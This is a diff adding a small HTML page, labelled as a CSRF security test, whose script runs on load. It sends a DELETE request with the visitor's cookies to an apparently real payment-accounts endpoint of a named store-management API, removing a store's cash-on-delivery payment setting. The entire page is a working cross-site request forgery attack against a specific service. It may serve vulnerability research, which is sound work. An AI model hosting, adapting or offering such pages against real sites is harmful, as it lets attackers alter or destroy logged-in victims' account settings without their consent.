@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <h1>Security Research - CSRF Test</h1>
+    <script>
+      fetch("https://api.smartbiz.in/stores/30406/payments/accounts?payment-method=COD", {
+        method: "DELETE",
+        headers: {
+          "Accept": "application/json, text/plain, */*",
+        },
+        credentials: "include" // Ye cookies send karne ke liye zaroori hai
+      })
+      .then(response => response.json())
+      .then(data => console.log("Response:", data))
+      .catch(err => console.error("Error:", err));
+    </script>
+  </body>
+</html>
